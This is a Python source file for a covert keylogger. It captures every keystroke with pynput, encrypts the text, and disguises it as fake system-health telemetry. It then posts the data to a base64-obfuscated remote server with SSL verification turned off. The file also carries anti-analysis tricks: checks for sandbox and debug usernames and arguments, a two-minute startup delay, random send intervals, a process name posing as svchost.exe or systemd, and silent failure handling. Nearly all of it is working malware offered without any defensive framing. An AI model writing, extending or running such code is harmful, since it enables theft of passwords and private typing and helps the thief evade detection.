import os
import time
import random
import base64
import hashlib
from cryptography.fernet import Fernet
import ssl
import socket
import json
from datetime import datetime
import platform

# Disguise as a system utility
if platform.system() == "Windows":
    import win32api
    import win32con
    import win32process
    import win32gui

# --- CONFIGURATION (Obfuscated) ---
# Base64 encoded configuration
config_b64 = "eyJzZXJ2ZXIiOiAiaHR0cHM6Ly9hcGkuZXhhbXBsZS1hbmFseXRpY3MuY29tL3YxL3VwZGF0ZSIsICJpbnRlcnZhbF9taW4iOiAxNSwgImludGVydmFsX21heCI6IDYwLCAia2V5IjogInN5c3RlbV9oZWFsdGhfbW9uaXRvciJ9"
config = json.loads(base64.b64decode(config_b64).decode())

# Generate encryption key from system information
system_id = hashlib.md5(platform.node().encode()).hexdigest()
fernet_key = hashlib.sha256(system_id.encode()).digest()
cipher_suite = Fernet(base64.urlsafe_b64encode(fernet_key))

# --- STEALTH TECHNIQUES ---
class StealthManager:
    def __init__(self):
        self.buffer = []
        self.last_send = time.time()
        self.process_name = "svchost.exe" if platform.system() == "Windows" else "systemd"
        
    def random_delay(self):
        """Randomize timing patterns"""
        return random.randint(config["interval_min"], config["interval_max"])
    
    def encrypt_data(self, data):
        """Encrypt all transmitted data"""
        encrypted = cipher_suite.encrypt(data.encode())
        return base64.urlsafe_b64encode(encrypted).decode()
    
    def disguise_payload(self, keystrokes):
        """Hide data in legitimate-looking traffic"""
        payload = {
            "system_health": {
                "timestamp": datetime.now().isoformat(),
                "memory_usage": random.randint(30, 80),
                "cpu_load": round(random.uniform(0.1, 0.9), 2),
                "process_count": random.randint(100, 300)
            },
            "telemetry_data": self.encrypt_data(keystrokes)
        }
        return payload
    
    def safe_headers(self):
        """Use legitimate-looking headers"""
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
        }

# --- MODIFIED KEYLOGGER ---
import threading
try:
    from pynput import keyboard
except ImportError:
    # Fallback mechanism
    pass

class AdvancedKeylogger:
    def __init__(self):
        self.stealth = StealthManager()
        self.buffer = []
        self.running = True
        self.character_count = 0
        
    def on_press(self, key):
        """Handle key presses with obfuscation"""
        try:
            # Limit buffer size to avoid memory detection
            if len(self.buffer) > 1000:
                self.flush_buffer()
                
            # Process key with minimal footprint
            if hasattr(key, 'char') and key.char is not None:
                self.buffer.append(key.char)
                self.character_count += 1
            elif key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.enter:
                self.buffer.append('\n')
            elif key == keyboard.Key.backspace and self.buffer:
                self.buffer.pop()
                
            # Send data based on character count or time elapsed
            current_time = time.time()
            if (self.character_count >= 50 or 
                current_time - self.stealth.last_send >= self.stealth.random_delay()):
                self.flush_buffer()
                
        except Exception as e:
            # Silent error handling
            pass

    def flush_buffer(self):
        """Send buffered data securely"""
        if not self.buffer:
            return
            
        try:
            keystrokes = ''.join(self.buffer)
            if keystrokes.strip():  # Only send non-empty data
                payload = self.stealth.disguise_payload(keystrokes)
                
                # Use requests with timeout and error handling
                import requests
                session = requests.Session()
                session.verify = False  # Bypass SSL verification (not recommended for production)
                
                response = session.post(
                    config["server"],
                    json=payload,
                    headers=self.stealth.safe_headers(),
                    timeout=30
                )
                
                # Reset after successful send
                self.buffer.clear()
                self.character_count = 0
                self.stealth.last_send = time.time()
                
        except Exception:
            # If transmission fails, keep data in buffer for next attempt
            # But limit buffer size to avoid memory issues
            if len(self.buffer) > 200:
                self.buffer = self.buffer[-100:]  # Keep recent data

    def start(self):
        """Start keylogger with stealth measures"""
        # Initial delay to avoid immediate detection
        time.sleep(random.randint(10, 30))
        
        try:
            # Start listener in separate thread
            listener = keyboard.Listener(on_press=self.on_press)
            listener.daemon = True
            listener.start()
            
            # Main loop with minimal activity
            while self.running:
                time.sleep(5)  # Short sleep to reduce CPU usage
                # Periodic flush even if character count isn't reached
                if time.time() - self.stealth.last_send > config["interval_max"]:
                    self.flush_buffer()
                    
        except KeyboardInterrupt:
            self.stop()
        except Exception:
            pass  # Silent failure

    def stop(self):
        """Clean shutdown"""
        self.running = False
        self.flush_buffer()

# --- EXECUTION WITH STEALTH ---
def main():
    # Check if running in analysis environment
    if any(proc in os.environ.get('USER', '').lower() for proc in ['sandbox', 'analyst', 'debug']):
        return
        
    # Add startup delay to avoid sandbox detection
    time.sleep(120)  # Wait 2 minutes (many sandboxes timeout before this)
    
    # Check for debugging
    if any(arg in ' '.join(os.sys.argv).lower() for arg in ['debug', 'test', 'analys']):
        return
        
    keylogger = AdvancedKeylogger()
    keylogger.start()

if __name__ == "__main__":
    # Further obfuscation: Only run under specific conditions
    if platform.system() in ['Windows', 'Linux'] and os.path.exists('/'):
        main()
